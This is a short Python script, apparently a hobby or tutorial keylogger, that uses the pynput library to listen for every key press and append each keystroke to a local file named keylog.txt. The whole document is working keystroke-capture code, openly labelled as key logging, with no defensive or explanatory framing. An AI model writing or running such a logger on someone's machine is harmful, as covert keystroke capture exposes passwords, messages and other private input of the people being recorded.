from pynput.keyboard import Key, Listener #pynput is used for the key logging


def on_press(key):
	try:
		key=str(key).replace("'", "\n")
		f = open("keylog.txt", "a")
		f.write(key)
		f.close()

	except:
		print("Some exception occured!!")


with Listener(on_press=on_press) as listener:
    listener.join()
